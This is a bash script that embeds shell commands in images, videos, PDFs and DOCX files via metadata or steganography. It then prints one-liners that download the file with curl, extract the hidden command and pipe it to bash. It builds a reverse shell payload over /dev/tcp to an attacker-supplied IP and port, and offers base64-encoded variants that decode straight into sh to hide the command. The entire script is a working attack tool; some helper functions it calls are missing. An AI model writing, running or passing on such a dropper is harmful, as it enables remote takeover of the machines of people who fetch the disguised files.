# Dynamic media compatibility check
is_media_compatible() {
    local file_extension="$1"
    local media_types=("png" "jpg" "jpeg" "mp3" "mp4" "gif" "pdf" "docx" "zip")
 
    for media in "${media_types[@]}"; do
        if [ "$file_extension" == "$media" ]; then
            return 0
        fi
    done
    return 1
}
 
# Generate reverse shell payload dynamically
generate_payload() {
    local payload_type="$1"
    local ip="$2"
    local port="$3"
 
    if [[ "$payload_type" == "reverse_shell" ]]; then
        echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
    else
        echo -e "\e[91mError: Unsupported payload type.\e[0m"
        exit 1
    fi
}
 
# Inject payload into media file using steganography
inject_with_steganography() {
    local command="$1"
    local filename="$2"
    steghide embed -cf "$filename" -ef <(echo "$command") -p ""
}
 
# Extract payload from the media file
extract_payload() {
    local filename="$1"
    local file_extension="${filename##*.}"
 
    if [[ "$file_extension" == "png" || "$file_extension" == "jpg" ]]; then
        exiftool "$filename" | grep "Comment"
    elif [[ "$file_extension" == "mp4" || "$file_extension" == "mp3" ]]; then
        ffprobe -v error -show_entries format_tags=comment -of default=nw=1:nk=1 "$filename"
    elif [[ "$file_extension" == "pdf" ]]; then
        pdfinfo "$filename" | grep "Title"
    elif [[ "$file_extension" == "docx" ]]; then
        unzip -p "$filename" | strings | grep "Payload"
    elif [[ "$file_extension" == "zip" ]]; then
        unzip -p "$filename" | strings | grep "Payload"
    else
        echo -e "\e[91mError: File extension not supported for payload extraction.\e[0m"
    fi
}
 
# Flag variables
encode_base64=false
use_steganography=false
extract_mode=false
generate_reverse_shell=false
payload_type=""
ip=""
port=""
 
# Parse command-line options
while [[ $# -gt 0 ]]; do
    case "$1" in
        -h|--help)
            show_help
            exit 0
            ;;
        -e|--encode)
            encode_base64=true
            shift
            ;;
        -c|--check)
            check_compatibility=true
            shift
            ;;
        -p|--payload)
            payload_type="$2"
            shift 2
            ;;
        -s|--steganography)
            use_steganography=true
            shift
            ;;
        -x|--extract)
            extract_mode=true
            shift
            ;;
        *)
            break
            ;;
    esac
done
 
# Check for the correct number of arguments
if [ $# -lt 3 ]; then
    echo -e "\e[91mError: Invalid number of arguments.\e[0m"
    show_help
    exit 1
fi
 
# Assign arguments
command="$1"
filename="$2"
url="$3"
 
# Extract file extension
file_extension="${filename##*.}"
 
# Compatibility check
if $check_compatibility; then
    if is_media_compatible "$file_extension"; then
        echo -e "\e[92mFile type $file_extension is compatible.\e[0m"
    else
        echo -e "\e[91mError: File extension $file_extension is not supported.\e[0m"
        exit 1
    fi
fi
 
# Payload generation (reverse shell)
if [[ "$payload_type" == "reverse_shell" ]]; then
    read -p "Enter IP address for reverse shell: " ip
    read -p "Enter port for reverse shell: " port
    command=$(generate_payload "$payload_type" "$ip" "$port")
fi
 
# Extract payload mode
if $extract_mode; then
    extract_payload "$filename"
    exit 0
fi
 
# Inject the payload
if is_media_compatible "$file_extension"; then
    if $use_steganography; then
        echo -e "\e[95mInjecting payload using steganography...\e[0m"
        inject_with_steganography "$command" "$filename"
        echo -e "\e[95mSteganography-based injection completed.\e[0m"
    else
        echo -e "\e[95mInjecting payload into media file...\e[0m"
        if [[ "$file_extension" == "png" || "$file_extension" == "jpg" ]]; then
            exiftool -Comment="$command" "$filename"
        elif [[ "$file_extension" == "mp4" || "$file_extension" == "mp3" ]]; then
            ffmpeg -i "$filename" -metadata comment="$command" -codec copy "injected_$filename"
        elif [[ "$file_extension" == "pdf" ]]; then
            exiftool -Title="$command" "$filename"
        elif [[ "$file_extension" == "docx" ]]; then
            echo "$command" > temp.txt
            zip "$filename" temp.txt
            rm temp.txt
        else
            echo -e "\e[91mError: Unsupported media type for command injection.\e[0m"
            exit 1
        fi
        echo -e "\e[95mMedia file payload injection completed.\e[0m"
    fi
else
    echo -e "\e[91mError: File extension $file_extension is not supported.\e[0m"
    exit 1
fi
 
# Generate one-liner method for execution
echo -e "\e[36mSelect a one-liner method for execution:\e[0m"
echo "1. image-exiftool-one-liner"
echo "2. video-ffprobe-one-liner"
echo "3. pdf-title-extraction-one-liner"
echo "4. docx-text-extraction-one-liner"
read -p "Enter the method number (1-4): " method_choice
 
case "$method_choice" in
    1)
        cmd="curl -s '$url/$filename' | exiftool -Comment -b - | bash"
        ;;
    2)
        cmd="curl -s '$url/$filename' | ffprobe -v error -show_entries format_tags=comment -of default=nw=1:nk=1 | bash"
        ;;
    3)
        cmd="curl -s '$url/$filename' | exiftool -Title -b - | bash"
        ;;
    4)
        cmd="curl -s '$url/$filename' | unzip -p - | grep Payload | bash"
        ;;
    *)
        echo -e "\e[91mError: Invalid method number.\e[0m"
        exit 1
        ;;
esac
 
# Base64 encode the one-liner if requested
if [ "$encode_base64" = true ]; then
    encoded_cmd=$(echo -n "$cmd" | base64)
    encoded_cmd="${encoded_cmd//[$'\t\r\n ']/}"
    echo -e "\e[0;36mSelect a decoding method:\e[0m"
    echo "1. Using awk"
    echo "2. Using xargs"
    read -p "Enter the decoding method number (1-2): " decode_method
 
    case "$decode_method" in
        1)
            echo "echo '$encoded_cmd' | awk '{ print \$0}' | base64 -d | sh"
            ;;
        2)
            echo "echo '$encoded_cmd' | base64 -d | xargs -I {} sh -c \"{}\""
            ;;
        *)
            echo "Invalid decoding method number."
            exit 1
            ;;
    esac
else
    one_liner="$cmd"
    echo -e "Generated one-liner:\n\e[0;31m$one_liner\e[0m"
fi
 
echo -e "\e[0;36mOne-liner method execution completed.\e[0m"
